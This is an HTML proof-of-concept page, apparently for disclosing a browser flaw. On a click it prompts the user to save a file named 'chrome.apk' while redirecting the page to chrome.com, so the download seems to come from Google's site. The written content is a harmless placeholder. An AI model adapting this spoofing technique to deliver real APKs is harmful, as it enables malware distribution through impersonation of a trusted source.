<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC</title>
</head>
<body>

<h1>Click anywhere</h1>

<script>
document.addEventListener('click', async () => {
    setTimeout(async () => {
        if ('showSaveFilePicker' in window) {
            try {
                const handle = await window.showSaveFilePicker({
                    suggestedName: 'chrome.apk',
                    types: [{
                        description: 'Android Package (PoC)',
                        accept: { 'application/octet-stream': ['.apk'] }
                    }]
                });

                const writable = await handle.createWritable();

                // ISI FILE (PoC only)
                await writable.write(
                    'PoC file\nThis is not a real APK\nFor demonstration only'
                );

                await writable.close();
            } catch (e) {
                // cancel expected
            }
        }
    }, 1000);

    setTimeout(() => {
        window.location.href = 'https://chrome.com';
    }, 1000);
}, { once: true });
</script>

</body>
</html>
